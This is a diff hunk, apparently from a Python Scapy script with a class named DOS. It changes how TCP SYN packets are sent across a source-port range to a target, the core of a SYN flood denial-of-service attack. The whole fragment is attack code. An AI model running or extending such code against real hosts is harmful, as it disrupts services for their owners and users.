@@ -76,4 +76,4 @@ class DOS():
         else: ip = IP(dst=self.target)
 
         # Sending TCP SYN packets on port range (start, end)
-        sendp(Ether() / ip / TCP(dport=self.port, sport=(start, end), flags='S'), verbose=0)
+        send(ip / TCP(dport=self.port, sport=(start, end), flags='S'), verbose=0)
